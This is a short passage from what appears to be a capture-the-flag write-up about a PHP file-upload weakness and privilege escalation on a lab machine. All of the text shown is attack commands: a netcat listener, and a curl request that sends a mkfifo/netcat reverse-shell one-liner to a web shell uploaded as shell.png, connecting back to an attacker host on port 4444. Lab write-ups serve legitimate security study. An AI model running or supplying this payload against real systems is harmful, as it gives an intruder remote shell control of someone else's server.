...
tags: [ptgarage, php, file-upload, cron, privesc]
---
...
`ash
nc -lvnp 4444
curl -G "http://<TARGET_IP>/support/uploads/shell.png" --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"
`
